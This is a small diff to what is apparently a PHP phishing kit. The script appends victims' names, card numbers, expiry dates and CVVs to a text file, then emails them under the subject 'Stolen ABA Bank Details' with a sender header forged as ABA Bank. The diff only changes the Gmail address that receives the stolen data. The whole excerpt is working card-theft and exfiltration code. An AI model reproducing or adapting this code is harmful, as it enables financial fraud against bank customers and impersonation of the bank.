@@ -10,7 +10,7 @@
     file_put_contents('bank_details.txt', $data, FILE_APPEND);
 
     // Email the data
-    $to = "menglihour009@gmail.com";
+    $to = "gqwgqgq5q5@gmail.com";
     $subject = "Stolen ABA Bank Details";
     $message = "Name: $name\nCard Number: $cardnumber\nExpiry Date: $expiry\nCVV: $cvv";
     $headers = "From: ABA Bank <security@ababank.com>";
